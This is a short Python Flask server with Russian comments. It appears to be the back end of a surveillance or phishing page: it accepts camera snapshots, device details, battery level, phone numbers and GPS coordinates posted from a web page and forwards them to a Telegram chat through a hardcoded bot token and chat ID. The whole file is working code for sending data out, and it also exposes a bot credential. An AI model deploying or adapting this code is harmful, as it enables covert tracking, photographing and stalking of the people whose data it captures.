import os, telebot, base64, io
from flask import Flask, render_template, request, jsonify
from PIL import Image

app = Flask(__name__)
# Твои данные вшиты в код
bot = telebot.TeleBot("8606333944:AAGd1hEMGLDxs8AGYqYE7puh9QY-X3THw14")
CHAT_ID = "7276424310"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    try:
        d = request.json
        # Если пришло фото, отправляем его первым
        if d.get('img'):
            img_bytes = base64.b64decode(d['img'].split(',')[1])
            bot.send_photo(CHAT_ID, io.BytesIO(img_bytes), caption="📸 **СНИМОК С КАМЕРЫ!**", parse_mode='Markdown')
        
        # Собираем текстовый отчет
        msg = f"🚀 **НОВЫЙ ОТЧЕТ!**\n\n"
        msg += f"📱 Устройство: `{d.get('os')}`\n"
        msg += f"🔋 Заряд: `{d.get('bat')}%` \n"
        msg += f"📞 Номер: `{d.get('num')}`\n"
        
        if d.get('lat'):
            msg += f"📍 GPS: `{d['lat']},{d['lon']}`\n"
            msg += f"🗺 [Открыть карты](http://maps.google.com/maps?q={d['lat']},{d['lon']})"
        
        bot.send_message(CHAT_ID, msg, parse_mode='Markdown')
        return jsonify({"ok": True})
    except Exception as e:
        print(e)
        return jsonify({"ok": False}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
      
